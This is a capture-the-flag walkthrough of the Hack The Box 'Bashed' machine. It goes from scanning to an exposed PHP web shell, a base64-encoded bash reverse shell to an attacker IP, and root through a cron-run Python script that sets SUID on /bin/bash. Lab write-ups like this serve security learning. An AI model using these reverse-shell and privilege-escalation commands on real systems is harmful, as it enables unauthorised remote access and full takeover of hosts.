---
icon: ubuntu
---

# Bashed - Easy

<figure><img src="../../.gitbook/assets/image (1792).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/bashed"><strong>Bashed</strong></a></p></figcaption></figure>

## Gaining Access

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.68 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 22:52 EDT
Nmap scan report for 10.10.10.68
Host is up (0.045s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   31.51 ms 10.10.16.1
2   58.76 ms 10.10.10.68
```

### Port 80 HTTP

<figure><img src="../../.gitbook/assets/image (1793).png" alt=""><figcaption></figcaption></figure>

Upon visiting the website, we are introduced to the idea of it hosting a php webshell, let's search for it.

### **Feroxbuster**

```
feroxbuster -u http://10.10.10.68/
```

<figure><img src="../../.gitbook/assets/image (1794).png" alt=""><figcaption></figcaption></figure>

We got a couple of interesting paths, but the one that caught my eye was <mark style="color:yellow;">**/dev/phpbash.php**</mark>

### Foothold

<figure><img src="../../.gitbook/assets/image (1795).png" alt=""><figcaption></figcaption></figure>

Upon visiting the path, we are immediately created with a php web shell. Let's get a reverse shell on our attack machine, I am going to base64 encode mine.

```
echo '/bin/bash -i >& /dev/tcp/10.10.16.3/80 0>&1' | base64
```

<figure><img src="../../.gitbook/assets/image (1796).png" alt=""><figcaption></figcaption></figure>

Then on the target machine we will run the following, Make sure you have a nc listener ready on port 80

```
echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjMvODAgMD4mMQo=" | base64 -d | /bin/bash
```

<figure><img src="../../.gitbook/assets/image (1797).png" alt=""><figcaption></figcaption></figure>

Check your listener, you should have a reverse shell as www-data

<figure><img src="../../.gitbook/assets/image (1799).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

**`sudo -l`** reveals that the ​www-data​ user can run any command as scriptmanager​, without having to provide a password.

<figure><img src="../../.gitbook/assets/image (1800).png" alt=""><figcaption></figcaption></figure>

### **Switching to user scriptmanager**

```
sudo -u scriptmanager /bin/bash
```

<figure><img src="../../.gitbook/assets/image (1801).png" alt=""><figcaption></figcaption></figure>

There is a scripts folder located at /, and inside there is a simple python script owned by scriptmanager. The script seems to be running as root and writing to a file. Let's verify using pspy

<figure><img src="../../.gitbook/assets/image (1802).png" alt=""><figcaption></figcaption></figure>

### Pspy

You can download [pspy](https://github.com/DominicBreuker/pspy/releases) from here, than transfer it to the target machine. I like to run it with the timeout command, that way I don't lose my tty shell trying to exit out of it.

```
timeout 5m ./pspy64
```

<figure><img src="../../.gitbook/assets/image (1803).png" alt=""><figcaption></figcaption></figure>

Reveals a cron job running as root on test.py and on any python scripts located inside scripts. As the user scriptmanager we have write access over the test.py script we can modify this script or create a new one either way they will be run as root.

I am going to modify the script to set the SUID permission bit on /bin/bash, so we can elevate our privileges to root. Using the below code

```
__import__('os').system('chmod +s /bin/bash')
```

I create the python script on my attack machine hosted on a simple python web server and downloaded it using wget on the target machine, then move it to the /scripts folder and replaced the original test.py script. Once the script gets execute by root, we should have the SUID bit on /bin/bash

<figure><img src="../../.gitbook/assets/image (1804).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1805).png" alt=""><figcaption></figcaption></figure>

And it worked, let's elevate our privileges to root, using the following command:

```
/bin/bash -p
```

<figure><img src="../../.gitbook/assets/image (1806).png" alt=""><figcaption></figcaption></figure>
